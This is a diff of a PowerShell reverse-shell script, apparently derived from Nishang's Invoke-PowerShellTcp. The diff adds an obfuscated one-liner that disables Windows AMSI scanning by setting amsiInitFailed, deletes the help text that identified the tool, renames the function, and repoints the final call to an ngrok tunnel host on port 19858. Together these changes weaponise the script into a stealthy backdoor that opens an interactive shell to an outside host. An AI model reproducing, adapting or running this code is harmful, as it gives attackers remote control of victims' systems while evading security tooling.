@@ -1,43 +1,6 @@
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 function PowerCPPJ 
 { 
-<#
-.SYNOPSIS
-Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
-
-.DESCRIPTION
-This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
-Also, a standard netcat can connect to this script Bind to a specific port.
-
-The script is derived from Powerfun written by Ben Turner & Dave Hardy
-
-.PARAMETER IPAddress
-The IP address to connect to when using the -Reverse switch.
-
-.PARAMETER Port
-The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
-
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
-
-Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
-the given IP and port. 
-
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Bind -Port 4444
-
-Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
-
-.EXAMPLE
-PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
-
-Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
-listening on the given IP and port. 
-
-.LINK
-http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
-https://github.com/nettitude/powershell/blob/master/powerfun.ps1
-https://github.com/samratashok/nishang
-#>      
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
 
         [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
@@ -125,4 +88,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-PowerCPPJ -Reverse -IPAddress 172.16.1.12 -Port 443
+PowerCPPJ -Reverse -IPAddress 6.tcp.ngrok.io -Port 19858
